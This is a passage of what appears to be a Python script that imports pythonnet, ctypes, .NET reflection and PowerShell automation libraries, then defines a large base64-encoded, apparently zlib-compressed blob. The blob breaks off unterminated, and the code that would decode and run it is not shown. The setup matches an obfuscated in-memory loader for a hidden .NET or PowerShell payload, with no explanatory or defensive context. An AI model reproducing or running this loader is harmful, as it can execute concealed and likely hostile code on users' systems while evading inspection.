import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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